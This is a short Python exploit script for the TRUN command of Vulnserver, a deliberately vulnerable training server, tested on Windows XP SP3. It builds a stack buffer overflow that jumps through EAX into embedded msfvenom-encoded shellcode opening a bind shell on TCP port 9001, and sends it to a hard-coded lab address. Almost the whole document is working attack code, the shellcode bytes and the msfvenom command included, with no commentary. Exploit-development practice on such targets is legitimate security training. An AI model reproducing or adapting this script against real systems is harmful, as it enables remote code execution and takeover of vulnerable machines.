# Exploit for Vulnserver - TRUN - Stack buffer Overflow (EAX)
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
import socket
import sys

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xbb\x4a\x9a\xa1\xc1\xd9\xc3\xd9\x74\x24"
shellcode_bind += b"\xf4\x5a\x2b\xc9\xb1\x53\x31\x5a\x12\x03"
shellcode_bind += b"\x5a\x12\x83\x88\x9e\x43\x34\xf0\x77\x01"
shellcode_bind += b"\xb7\x08\x88\x66\x31\xed\xb9\xa6\x25\x66"
shellcode_bind += b"\xe9\x16\x2d\x2a\x06\xdc\x63\xde\x9d\x90"
shellcode_bind += b"\xab\xd1\x16\x1e\x8a\xdc\xa7\x33\xee\x7f"
shellcode_bind += b"\x24\x4e\x23\x5f\x15\x81\x36\x9e\x52\xfc"
shellcode_bind += b"\xbb\xf2\x0b\x8a\x6e\xe2\x38\xc6\xb2\x89"
shellcode_bind += b"\x73\xc6\xb2\x6e\xc3\xe9\x93\x21\x5f\xb0"
shellcode_bind += b"\x33\xc0\x8c\xc8\x7d\xda\xd1\xf5\x34\x51"
shellcode_bind += b"\x21\x81\xc6\xb3\x7b\x6a\x64\xfa\xb3\x99"
shellcode_bind += b"\x74\x3b\x73\x42\x03\x35\x87\xff\x14\x82"
shellcode_bind += b"\xf5\xdb\x91\x10\x5d\xaf\x02\xfc\x5f\x7c"
shellcode_bind += b"\xd4\x77\x53\xc9\x92\xdf\x70\xcc\x77\x54"
shellcode_bind += b"\x8c\x45\x76\xba\x04\x1d\x5d\x1e\x4c\xc5"
shellcode_bind += b"\xfc\x07\x28\xa8\x01\x57\x93\x15\xa4\x1c"
shellcode_bind += b"\x3e\x41\xd5\x7f\x57\xa6\xd4\x7f\xa7\xa0"
shellcode_bind += b"\x6f\x0c\x95\x6f\xc4\x9a\x95\xf8\xc2\x5d"
shellcode_bind += b"\xd9\xd2\xb3\xf1\x24\xdd\xc3\xd8\xe2\x89"
shellcode_bind += b"\x93\x72\xc2\xb1\x7f\x82\xeb\x67\x15\x8a"
shellcode_bind += b"\x4a\xd8\x08\x77\x2c\x88\x8c\xd7\xc5\xc2"
shellcode_bind += b"\x02\x08\xf5\xec\xc8\x21\x9e\x10\xf3\x6e"
shellcode_bind += b"\x76\x9c\x15\x1a\x98\xc8\x8e\xb2\x5a\x2f"
shellcode_bind += b"\x07\x25\xa4\x05\x3f\xc1\xed\x4f\xf8\xee"
shellcode_bind += b"\xed\x45\xae\x78\x66\x8a\x6a\x99\x79\x87"
shellcode_bind += b"\xda\xce\xee\x5d\x8b\xbd\x8f\x62\x86\x55"
shellcode_bind += b"\x33\xf0\x4d\xa5\x3a\xe9\xd9\xf2\x6b\xdf"
shellcode_bind += b"\x13\x96\x81\x46\x8a\x84\x5b\x1e\xf5\x0c"
shellcode_bind += b"\x80\xe3\xf8\x8d\x45\x5f\xdf\x9d\x93\x60"
shellcode_bind += b"\x5b\xc9\x4b\x37\x35\xa7\x2d\xe1\xf7\x11"
shellcode_bind += b"\xe4\x5e\x5e\xf5\x71\xad\x61\x83\x7d\xf8"
shellcode_bind += b"\x17\x6b\xcf\x55\x6e\x94\xe0\x31\x66\xed"
shellcode_bind += b"\x1c\xa2\x89\x24\xa5\xc2\x6b\xec\xd0\x6a"
shellcode_bind += b"\x32\x65\x59\xf7\xc5\x50\x9e\x0e\x46\x50"
shellcode_bind += b"\x5f\xf5\x56\x11\x5a\xb1\xd0\xca\x16\xaa"
shellcode_bind += b"\xb4\xec\x85\xcb\x9c"

cmd     = "TRUN /.:/"
nops1   = 8 * "\x90"
sub_sp  = "\x89\xc4\x66\x81\xec\x04\x01" # MOV ESP, EAX # SUB SP, 0x104
nops2   = 8 * "\x90"
junk    = "A" * (2003-len(shellcode_bind+nops1+nops2+sub_sp))
jump    = "\x0c\x10\x40"  # 0x0040100c : jmp eax in vulnserver.exe

buffer = cmd + nops1 + sub_sp + nops2 + shellcode_bind + junk + jump

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.35.132", 9999))
print s.recv(1024)
s.send(buffer)
s.close()
